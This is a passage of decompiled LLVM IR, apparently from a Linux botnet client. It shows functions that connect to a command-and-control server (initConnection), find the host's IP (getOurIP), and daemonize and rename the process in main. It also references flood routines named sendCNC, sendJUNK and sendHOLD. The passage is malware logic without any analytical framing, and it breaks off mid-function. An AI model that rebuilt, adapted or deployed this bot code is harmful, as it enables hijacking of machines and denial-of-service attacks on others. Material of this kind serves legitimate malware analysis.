  uselistorder i1* %cf.global-to-local, { 0, 1, 9, 2, 8, 3, 4, 5, 6, 7, 10, 253, 11, 12, 13, 18, 14, 15, 16, 17, 254, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 189, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 255, 47, 48, 49, 54, 50, 51, 52, 53, 256, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 257, 66, 67, 68, 69, 70, 197, 190, 191, 192, 193, 194, 195, 196, 258, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 259, 209, 210, 211, 217, 212, 213, 214, 215, 216, 260, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 261, 229, 230, 231, 232, 233, 234, 242, 235, 236, 237, 238, 239, 240, 241, 262, 243, 244, 245, 246, 247, 263, 248, 249, 250, 71, 252, 251, 264, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 265, 99, 100, 101, 107, 102, 103, 104, 105, 106, 266, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 267, 119, 120, 121, 126, 122, 123, 124, 125, 268, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 145, 138, 139, 140, 141, 142, 143, 144, 146, 164, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 170, 166, 167, 168, 169, 171, 176, 172, 173, 174, 175, 177, 181, 178, 179, 180, 182, 185, 183, 184, 186, 187, 188 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805add1.423 to i32), { 15, 0, 14, 1, 13, 2, 12, 3, 11, 4, 10, 5, 9, 6, 8, 7, 16, 17 }
  uselistorder [3 x i8]* @global_var_805ae60.442, { 1, 0 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050819, { 47, 15, 16, 0, 17, 18, 19, 20, 21, 7, 22, 1, 23, 8, 24, 2, 38, 9, 39, 3, 40, 10, 41, 11, 42, 4, 25, 26, 27, 28, 29, 30, 12, 31, 5, 32, 13, 33, 6, 34, 14, 35, 43, 36, 37, 44, 45, 46 }
  uselistorder label %dec_label_pc_805076b, { 1, 0 }
  uselistorder label %dec_label_pc_8050768, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80506b9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050632, { 1, 0 }
  uselistorder label %dec_label_pc_80505fb, { 1, 0 }
  uselistorder label %dec_label_pc_80505c6, { 1, 0 }
  uselistorder label %dec_label_pc_805053f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050431, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80503c2, { 1, 0 }
  uselistorder label %dec_label_pc_80502cd, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80501fd, { 1, 0 }
  uselistorder label %dec_label_pc_8050104, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050084, { 1, 0 }
  uselistorder label %dec_label_pc_804ff8f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fe57, { 1, 0 }
  uselistorder label %dec_label_pc_804fdc3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd39, { 1, 0 }
  uselistorder label %dec_label_pc_804fcfc, { 1, 0 }
  uselistorder label %dec_label_pc_804fb3b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804faa3, { 1, 0 }
  uselistorder label %dec_label_pc_804f998, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f911, { 1, 0 }
  uselistorder label %dec_label_pc_804f6b3, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_805082a = ptrtoint i32* %stack_var_-4104 to i32
  %v3_805083e = bitcast i32* %stack_var_-4104 to i8*
  %v4_805083e = call i32 @__GI_memset(i8* %v3_805083e, i32 0, i32 4096)
  %v0_8050846 = load i32, i32* @global_var_805d480.20, align 128
  %v1_805084b = icmp eq i32 %v0_8050846, 0
  br i1 %v1_805084b, label %dec_label_pc_805086a, label %dec_label_pc_805084f

dec_label_pc_805084f:                             ; preds = %entry
  %v1_8050858 = call i32 @__libc_close(i32 %v0_8050846)
  store i32 0, i32* @global_var_805d480.20, align 128
  br label %dec_label_pc_805086a

dec_label_pc_805086a:                             ; preds = %entry, %dec_label_pc_805084f
  %v0_805086a = load i32, i32* @global_var_805d0f0.455, align 16
  %v1_805086f = icmp eq i32 %v0_805086a, 0
  %v1_8050871 = icmp eq i1 %v1_805086f, false
  br i1 %v1_8050871, label %dec_label_pc_805087f, label %dec_label_pc_805088a

dec_label_pc_805087f:                             ; preds = %dec_label_pc_805086a
  %v1_8050884 = add i32 %v0_805086a, 1
  br label %dec_label_pc_805088a

dec_label_pc_805088a:                             ; preds = %dec_label_pc_805086a, %dec_label_pc_805087f
  %storemerge = phi i32 [ %v1_8050884, %dec_label_pc_805087f ], [ 0, %dec_label_pc_805086a ]
  store i32 %storemerge, i32* @global_var_805d0f0.455, align 16
  %v1_805088f = mul i32 %storemerge, 4
  %v2_805088f = add i32 %v1_805088f, ptrtoint ([16 x i8]** @global_var_805d040.457 to i32)
  %v3_805088f = inttoptr i32 %v2_805088f to i32*
  %v4_805088f = load i32, i32* %v3_805088f, align 4
  store i32 %v4_805088f, i32* @eax, align 4
  %v3_80508a1 = call i32 @strcpy(i8* %v3_805083e, i32 %v4_805088f)
  %v0_80508a9 = load i32, i32* @global_var_805d044.458, align 4
  %v3_80508bd = call i32 @__GI_strchr(i8* %v3_805083e, i32 58)
  %v1_80508c5 = icmp eq i32 %v3_80508bd, 0
  br i1 %v1_80508c5, label %dec_label_pc_8050904, label %dec_label_pc_80508c9

dec_label_pc_80508c9:                             ; preds = %dec_label_pc_805088a
  %v3_80508d5 = call i32 @__GI_strchr(i8* %v3_805083e, i32 58)
  %v1_80508dd = add i32 %v3_80508d5, 1
  %v1_80508e2 = call i32 @atol(i32 %v1_80508dd)
  %v3_80508f9 = call i32 @__GI_strchr(i8* %v3_805083e, i32 58)
  %v4_80508f9 = inttoptr i32 %v3_80508f9 to i8*
  store i8 0, i8* %v4_80508f9, align 1
  br label %dec_label_pc_8050904

dec_label_pc_8050904:                             ; preds = %dec_label_pc_805088a, %dec_label_pc_80508c9
  %stack_var_-8.0 = phi i32 [ %v0_80508a9, %dec_label_pc_805088a ], [ %v1_80508e2, %dec_label_pc_80508c9 ]
  %v3_805090d = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_805090d, i32* @global_var_805d480.20, align 128
  %v4_805092d = call i32 @connectTimeout(i32 %v3_805090d, i32 %v2_805082a, i32 %stack_var_-8.0, i32 30)
  %v1_8050935 = icmp eq i32 %v4_805092d, 0
  %. = zext i1 %v1_8050935 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14 }
  uselistorder label %dec_label_pc_8050904, { 1, 0 }
  uselistorder label %dec_label_pc_805088a, { 1, 0 }
  uselistorder label %dec_label_pc_805086a, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_8050969 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_8050974 = icmp eq i32 %v5_8050969, -1
  %v1_8050978 = icmp eq i1 %v13_8050974, false
  br i1 %v1_8050978, label %dec_label_pc_8050989, label %dec_label_pc_8050b4c

dec_label_pc_8050989:                             ; preds = %entry
  %v2_8050989 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_80509b5 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805aeb8.459 to i32))
  %v2_80509c5 = call i32 @htons(i32 53)
  %v5_80509dd = call i32 @__libc_connect(i32 %v5_8050969, i32 %v2_8050989, i32 16)
  %v13_80509e8 = icmp eq i32 %v5_80509dd, -1
  %v1_80509ec = icmp eq i1 %v13_80509e8, false
  br i1 %v1_80509ec, label %dec_label_pc_80509fd, label %dec_label_pc_8050b4c

dec_label_pc_80509fd:                             ; preds = %dec_label_pc_8050989
  store i32 16, i32* %stack_var_-60, align 4
  %v2_8050a04 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8050a0a = ptrtoint i32* %stack_var_-60 to i32
  %v5_8050a12 = call i32 @__GI_getsockname(i32 %v5_8050969, i32 %v2_8050a04, i32 %v2_8050a0a)
  %v13_8050a1d = icmp eq i32 %v5_8050a12, -1
  %v1_8050a21 = icmp eq i1 %v13_8050a1d, false
  br i1 %v1_8050a21, label %dec_label_pc_8050a32, label %dec_label_pc_8050b4c

dec_label_pc_8050a32:                             ; preds = %dec_label_pc_80509fd
  %v1_8050a35 = inttoptr i32 %tmp18 to i8*
  store i8* %v1_8050a35, i8** @global_var_8063708.232, align 8
  %v5_8050a44 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805aec0.460, i32 0, i32 0), i32 0)
  %v2_8050aa7 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_8050ab951 = call i32 @fdgets(i32 %v2_8050aa7, i32 4096, i32 %v5_8050a44)
  %v1_8050ac152 = icmp eq i32 %v5_8050ab951, 0
  %v1_8050ac353 = icmp eq i1 %v1_8050ac152, false
  br i1 %v1_8050ac353, label %dec_label_pc_8050a51, label %dec_label_pc_8050ac5

dec_label_pc_8050a51:                             ; preds = %dec_label_pc_8050a32, %dec_label_pc_8050a8b
  %v5_8050a60 = call i32 @strstr(i32 %v2_8050aa7, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805aed0.461, i32 0, i32 0))
  %v1_8050a68 = icmp eq i32 %v5_8050a60, 0
  br i1 %v1_8050a68, label %dec_label_pc_8050a8b, label %dec_label_pc_8050a7a.preheader

dec_label_pc_8050a7a.preheader:                   ; preds = %dec_label_pc_8050a51
  %v2_8050a7d42 = load i8, i8* %stack_var_-4156, align 1
  %v10_8050a7f47 = icmp eq i8 %v2_8050a7d42, 9
  %v1_8050a8148 = icmp eq i1 %v10_8050a7f47, false
  br i1 %v1_8050a8148, label %dec_label_pc_8050a77, label %dec_label_pc_8050a83

dec_label_pc_8050a77:                             ; preds = %dec_label_pc_8050a7a.preheader, %dec_label_pc_8050a77
  %v4_8050a7a49 = phi i32 [ %v5_8050a77, %dec_label_pc_8050a77 ], [ %v2_8050aa7, %dec_label_pc_8050a7a.preheader ]
  %v5_8050a77 = add i32 %v4_8050a7a49, 1
  %v22_8050a77 = inttoptr i32 %v5_8050a77 to i8*
  %v2_8050a7d = load i8, i8* %v22_8050a77, align 1
  %v10_8050a7f = icmp eq i8 %v2_8050a7d, 9
  %v1_8050a81 = icmp eq i1 %v10_8050a7f, false
  br i1 %v1_8050a81, label %dec_label_pc_8050a77, label %dec_label_pc_8050a83

dec_label_pc_8050a83:                             ; preds = %dec_label_pc_8050a77, %dec_label_pc_8050a7a.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_8050a7a.preheader ], [ %v22_8050a77, %dec_label_pc_8050a77 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_8050ac5

dec_label_pc_8050a8b:                             ; preds = %dec_label_pc_8050a51
  %v6_8050a9f = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_8050ab9 = call i32 @fdgets(i32 %v2_8050aa7, i32 4096, i32 %v5_8050a44)
  %v1_8050ac1 = icmp eq i32 %v5_8050ab9, 0
  %v1_8050ac3 = icmp eq i1 %v1_8050ac1, false
  br i1 %v1_8050ac3, label %dec_label_pc_8050a51, label %dec_label_pc_8050ac5

dec_label_pc_8050ac5:                             ; preds = %dec_label_pc_8050a32, %dec_label_pc_8050a8b, %dec_label_pc_8050a83
  %v2_8050acb = call i32 @__libc_close(i32 %v5_8050a44)
  %v3_8050ad3 = load i8, i8* %stack_var_-4156, align 1
  %v4_8050ad9 = icmp eq i8 %v3_8050ad3, 0
  br i1 %v4_8050ad9, label %dec_label_pc_8050b3c, label %dec_label_pc_8050add

dec_label_pc_8050add:                             ; preds = %dec_label_pc_8050ac5
  %v2_8050ae7 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_8050ae7, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_8050aee = call i32 @strcpy(i8* %tmp39, i32 %v2_8050aa7)
  %v5_8050b08 = call i32 @ioctl(i32 %v5_8050969, i32 35111, i32 %v2_8050ae7)
  %v2_8050b22 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_8050b19

dec_label_pc_8050b19:                             ; preds = %dec_label_pc_8050add, %dec_label_pc_8050b19
  %storemerge40 = phi i32 [ 0, %dec_label_pc_8050add ], [ %v4_8050b33, %dec_label_pc_8050b19 ]
  %v2_8050b28 = add i32 %storemerge40, %v2_8050b22
  %v1_8050b2b = inttoptr i32 %v2_8050b28 to i8*
  %v2_8050b2b = load i8, i8* %v1_8050b2b, align 1
  %v3_8050b2d = add i32 %storemerge40, ptrtoint (i8** @global_var_805d490.462 to i32)
  %v4_8050b2d = inttoptr i32 %v3_8050b2d to i8*
  store i8 %v2_8050b2b, i8* %v4_8050b2d, align 1
  %v4_8050b33 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_8050b33, 6
  br i1 %exitcond, label %dec_label_pc_8050b3c.loopexit, label %dec_label_pc_8050b19

dec_label_pc_8050b3c.loopexit:                    ; preds = %dec_label_pc_8050b19
  br label %dec_label_pc_8050b3c

dec_label_pc_8050b3c:                             ; preds = %dec_label_pc_8050b3c.loopexit, %dec_label_pc_8050ac5
  %v2_8050b42 = call i32 @__libc_close(i32 %v5_8050969)
  %v3_8050b58.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_8050b58

dec_label_pc_8050b4c:                             ; preds = %dec_label_pc_80509fd, %dec_label_pc_8050989, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_8050b58

dec_label_pc_8050b58:                             ; preds = %dec_label_pc_8050b3c, %dec_label_pc_8050b4c
  %v3_8050b58 = phi i32 [ %v3_8050b58.pre, %dec_label_pc_8050b3c ], [ 0, %dec_label_pc_8050b4c ]
  ret i32 %v3_8050b58

; uselistorder directives
  uselistorder i32 %v5_8050a77, { 1, 0 }
  uselistorder i32 %v2_8050aa7, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_8050a44, { 2, 1, 0 }
  uselistorder i32 %v5_8050969, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 15, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050b58, { 1, 0 }
  uselistorder label %dec_label_pc_8050b19, { 1, 0 }
  uselistorder label %dec_label_pc_8050ac5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050a77, { 1, 0 }
  uselistorder label %dec_label_pc_8050a51, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_8050b70 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805aedb.463 to i32), i32 0)
  %v10_8050b78 = icmp eq i32 %v3_8050b70, -1
  %v4_8050b8d = select i1 %v10_8050b78, i32 ptrtoint ([7 x i8]* @global_var_805aef2.465 to i32), i32 ptrtoint ([7 x i8]* @global_var_805aeeb.464 to i32)
  ret i32 %v4_8050b8d
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp93 = call i8* @__decompiler_undefined_function_2()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5392 = alloca i32, align 4
  %stack_var_-5364 = alloca i32, align 4
  %stack_var_-5376 = alloca i8*, align 4
  %stack_var_-5360 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8050b92 = ptrtoint i32* %stack_var_4 to i32
  %v5_8050bb6 = icmp ult i32* %stack_var_-5360, inttoptr (i32 8 to i32*)
  store i1 %v5_8050bb6, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805aedb.463, i32 0, i32 0), i8** %stack_var_-5376, align 4
  %v4_8050bc0 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805aedb.463 to i32), i32 0)
  store i32 %v4_8050bc0, i32* %eax.global-to-local, align 4
  %v5_8050bc8 = icmp ne i32 %v4_8050bc0, -1
  store i1 %v5_8050bc8, i1* %cf.global-to-local, align 1
  %v10_8050bc8 = icmp eq i32 %v4_8050bc0, -1
  %v0_8050bdd = call i32 @geteuid()
  store i32 %v0_8050bdd, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050be2 = icmp eq i32 %v0_8050bdd, 0
  %v1_8050be4 = icmp eq i1 %v1_8050be2, false
  %tmp201 = select i1 %v10_8050bc8, i32 ptrtoint ([19 x i8]* @global_var_805aeff.468 to i32), i32 ptrtoint ([5 x i8]* @global_var_805aefa.467 to i32)
  br i1 %v1_8050be4, label %dec_label_pc_8050bf0, label %dec_label_pc_8050be6

dec_label_pc_8050be6:                             ; preds = %entry
  store i32 0, i32* @global_var_805d0ec.469, align 4
  br label %dec_label_pc_8050bf0

dec_label_pc_8050bf0:                             ; preds = %entry, %dec_label_pc_8050be6
  %v0_8050bf0 = call i32 @getBuild()
  store i32 %v0_8050bf0, i32* %eax.global-to-local, align 4
  %v0_8050bf8 = load i32, i32* @esp, align 4
  %v5_8050bf8 = icmp ult i32 %v0_8050bf8, 12
  store i1 %v5_8050bf8, i1* %cf.global-to-local, align 1
  %v0_8050bfb13 = load i32, i32* bitcast (i8** @global_var_8063708.232 to i32*), align 4
  %tmp137 = bitcast i8** %stack_var_-5376 to i32*
  store i32 %v0_8050bfb13, i32* %tmp137, align 4
  %v2_8050c01 = call i32 @__GI_inet_ntoa(i32 %v0_8050bfb13)
  store i32 %v2_8050c01, i32* %eax.global-to-local, align 4
  %v0_8050c06 = load i32, i32* @esp, align 4
  %v2_8050c06 = icmp ugt i32 %v0_8050c06, -17
  store i1 %v2_8050c06, i1* %cf.global-to-local, align 1
  store i32 %v2_8050c01, i32* @ebx, align 4
  %v0_8050c0b = call i32 @getBuild()
  store i32 %v0_8050c0b, i32* %eax.global-to-local, align 4
  %v0_8050c10 = load i32, i32* @esp, align 4
  %v5_8050c10 = icmp ult i32 %v0_8050c10, 4
  store i1 %v5_8050c10, i1* %cf.global-to-local, align 1
  %v0_8050c13 = load i32, i32* @ebx, align 4
  %v5_8050c13 = inttoptr i32 %v0_8050c13 to i8*
  %v5_8050c14 = inttoptr i32 %v0_8050c0b to i8*
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805af12.470, i32 0, i32 0), i8** %stack_var_-5376, align 4
  %v9_8050c1a = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805af12.470, i32 0, i32 0), i8* %v5_8050c14, i8* %v5_8050c13)
  store i32 %v9_8050c1a, i32* %eax.global-to-local, align 4
  %v0_8050c1f = load i32, i32* @esp, align 4
  %v2_8050c1f = icmp ugt i32 %v0_8050c1f, -17
  store i1 %v2_8050c1f, i1* %cf.global-to-local, align 1
  store i32 %v2_8050b92, i32* %edx.global-to-local, align 4
  %v1_8050c28 = add i32 %v2_8050b92, 4
  %v2_8050c28 = inttoptr i32 %v1_8050c28 to i32*
  %v3_8050c28 = load i32, i32* %v2_8050c28, align 4
  store i32 %v3_8050c28, i32* %eax.global-to-local, align 4
  %v1_8050c2b = inttoptr i32 %v3_8050c28 to i32*
  %v2_8050c2b = load i32, i32* %v1_8050c2b, align 4
  %v1_8050c38 = and i32 %v2_8050c2b, -256
  store i32 %v1_8050c38, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8050c3b = inttoptr i32 %v2_8050c2b to i8*
  store i32 %v2_8050c2b, i32* @edi, align 4
  %v3_8050c41 = call i32 @_strlen(i8* %v4_8050c3b)
  %v4_8050c41 = mul i32 %v3_8050c41, -1
  %v1_8050c45 = sub i32 1, %v4_8050c41
  store i32 %v1_8050c45, i32* %eax.global-to-local, align 4
  %v1_8050c47 = sub i32 0, %v4_8050c41
  store i32 %v1_8050c47, i32* %edx.global-to-local, align 4
  %v3_8050c50 = load i32, i32* %v2_8050c28, align 4
  store i32 %v3_8050c50, i32* %eax.global-to-local, align 4
  %v1_8050c53 = inttoptr i32 %v3_8050c50 to i32*
  %v2_8050c53 = load i32, i32* %v1_8050c53, align 4
  store i32 %v2_8050c53, i32* %eax.global-to-local, align 4
  %v0_8050c55 = load i32, i32* @esp, align 4
  %v5_8050c55 = icmp ult i32 %v0_8050c55, 4
  store i1 %v5_8050c55, i1* %cf.global-to-local, align 1
  %v5_8050c5e = inttoptr i32 %v2_8050c53 to i8*
  store i8* %v5_8050c5e, i8** %stack_var_-5376, align 4
  %v7_8050c5f = call i32 @strncpy(i8* %v5_8050c5e, i32 ptrtoint (i8** @global_var_805aef9.466 to i32), i32 %v1_8050c47)
  store i32 %v7_8050c5f, i32* %eax.global-to-local, align 4
  store i32 %v2_8050b92, i32* @esi, align 4
  %v3_8050c6d = load i32, i32* %v2_8050c28, align 4
  store i32 %v3_8050c6d, i32* %eax.global-to-local, align 4
  %v1_8050c70 = inttoptr i32 %v3_8050c6d to i32*
  %v2_8050c70 = load i32, i32* %v1_8050c70, align 4
  store i32 %v2_8050c70, i32* %eax.global-to-local, align 4
  store i1 %v5_8050bb6, i1* %cf.global-to-local, align 1
  %v5_8050c78 = inttoptr i32 %v2_8050c70 to i8*
  store i8* %v5_8050c78, i8** %stack_var_-5376, align 4
  %v4_8050c79 = call i32 @sprintf(i32 %v2_8050c70, i32 %tmp201)
  store i32 %tmp201, i32* %eax.global-to-local, align 4
  %v5_8050c84 = icmp ult i32* %stack_var_-5360, inttoptr (i32 12 to i32*)
  store i1 %v5_8050c84, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5376, align 4
  store i32 15, i32* %stack_var_-5392, align 4
  %v7_8050c90 = call i32 @prctl(i32 15, i32 %tmp201, i32 0, i32 0, i32 0)
  store i32 %v7_8050c90, i32* %eax.global-to-local, align 4
  store i1 %v5_8050c84, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5376, align 4
  %v3_8050c9d = call i32 @__GI_time(i32* null)
  store i32 %v3_8050c9d, i32* %eax.global-to-local, align 4
  %v0_8050ca2 = load i32, i32* @esp, align 4
  %v2_8050ca2 = icmp ugt i32 %v0_8050ca2, -17
  store i1 %v2_8050ca2, i1* %cf.global-to-local, align 1
  store i32 %v3_8050c9d, i32* @ebx, align 4
  %v0_8050ca7 = call i32 @__libc_getpid()
  %v1_8050cac = load i32, i32* @ebx, align 4
  %v2_8050cac = xor i32 %v1_8050cac, %v0_8050ca7
  store i32 %v2_8050cac, i32* @eax, align 4
  %v0_8050cae = load i32, i32* @esp, align 4
  %v5_8050cae = icmp ult i32 %v0_8050cae, 12
  store i1 %v5_8050cae, i1* %cf.global-to-local, align 1
  %v5_8050cb1 = inttoptr i32 %v2_8050cac to i8*
  store i8* %v5_8050cb1, i8** %stack_var_-5376, align 4
  %v2_8050cb2 = call i32 @srand(i32 %v2_8050cac)
  store i32 %v2_8050cb2, i32* %eax.global-to-local, align 4
  store i1 %v5_8050c84, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5376, align 4
  %v3_8050cbf = call i32 @__GI_time(i32* null)
  store i32 %v3_8050cbf, i32* %eax.global-to-local, align 4
  %v0_8050cc4 = load i32, i32* @esp, align 4
  %v2_8050cc4 = icmp ugt i32 %v0_8050cc4, -17
  store i1 %v2_8050cc4, i1* %cf.global-to-local, align 1
  store i32 %v3_8050cbf, i32* @ebx, align 4
  %v0_8050cc9 = call i32 @__libc_getpid()
  %v1_8050cce = load i32, i32* @ebx, align 4
  %v2_8050cce = xor i32 %v1_8050cce, %v0_8050cc9
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8050cce, i32* %eax.global-to-local, align 4
  store i32 %v2_8050cce, i32* %stack_var_-5364, align 4
  %v1_8050cd1 = call i32 @init_rand(i32 %v2_8050cce)
  store i32 %v1_8050cd1, i32* %eax.global-to-local, align 4
  %v0_8050cd6 = load i32, i32* @esp, align 4
  %v5_8050cd6 = icmp ugt i32 %v0_8050cd6, -5
  store i1 %v5_8050cd6, i1* %cf.global-to-local, align 1
  %v0_8050cd9 = call i32 @getOurIP()
  store i32 %v0_8050cd9, i32* %eax.global-to-local, align 4
  %v0_8050cde = load i32, i32* %stack_var_-5364, align 4
  %v1_8050cde = call i32 @__libc_fork(i32 %v0_8050cde)
  store i32 %v1_8050cde, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050ce6 = icmp eq i32 %v1_8050cde, 0
  br i1 %v4_8050ce6, label %dec_label_pc_8050d10, label %dec_label_pc_8050d0a.thread

dec_label_pc_8050d0a.thread:                      ; preds = %dec_label_pc_8050bf0
  %v0_8050cec = load i32, i32* @esp, align 4
  %v5_8050cec = icmp ult i32 %v0_8050cec, 4
  store i1 %v5_8050cec, i1* %cf.global-to-local, align 1
  %v2_8050cf1 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_8050cf1, i32* %eax.global-to-local, align 4
  %v8_8050cf5 = inttoptr i32 %v1_8050cde to i8*
  store i8* %v8_8050cf5, i8** %stack_var_-5376, align 4
  %v6_8050cf8 = call i32 @__libc_waitpid(i32 %v1_8050cde, i32 %v2_8050cf1, i32 0)
  store i32 %v6_8050cf8, i32* @eax, align 4
  store i1 %v5_8050c84, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5376, align 4
  %v2_8050d05 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8050d05, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050d28

dec_label_pc_8050d10:                             ; preds = %dec_label_pc_8050bf0
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_8050d10 = load i8*, i8** %stack_var_-5376, align 4
  %v1_8050d10 = ptrtoint i8* %v0_8050d10 to i32
  %v2_8050d10 = call i32 @__libc_fork(i32 %v1_8050d10)
  store i32 %v2_8050d10, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050d18 = icmp eq i32 %v2_8050d10, 0
  br i1 %v4_8050d18, label %dec_label_pc_8050d28, label %dec_label_pc_8050d1e

dec_label_pc_8050d1e:                             ; preds = %dec_label_pc_8050d10
  %v0_8050d1e = load i32, i32* @esp, align 4
  %v5_8050d1e = icmp ult i32 %v0_8050d1e, 12
  store i1 %v5_8050d1e, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-5392, align 4
  %v1_8050d23 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8050d23, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d28

dec_label_pc_8050d28:                             ; preds = %dec_label_pc_8050d0a.thread, %dec_label_pc_8050d10, %dec_label_pc_8050d1e
  %v0_8050d28 = call i32 @__GI_setsid()
  store i32 %v0_8050d28, i32* %eax.global-to-local, align 4
  %v0_8050d2d = load i32, i32* @esp, align 4
  %v5_8050d2d = icmp ult i32 %v0_8050d2d, 12
  store i1 %v5_8050d2d, i1* %cf.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_805af1f.471 to i32), i32* %stack_var_-5392, align 4
  %v1_8050d35 = call i32 @chdir(i32 ptrtoint (i32* @global_var_805af1f.471 to i32))
  store i32 %v1_8050d35, i32* %eax.global-to-local, align 4
  %v5_8050d3d = icmp ult i8** %stack_var_-5376, inttoptr (i32 8 to i8**)
  store i1 %v5_8050d3d, i1* %cf.global-to-local, align 1
  store i32 13, i32* %stack_var_-5392, align 4
  %v3_8050d44 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_8050d44, i32* %eax.global-to-local, align 4
  %v0_8050d49 = load i32, i32* @esp, align 4
  %v2_8050d49 = icmp ugt i32 %v0_8050d49, -17
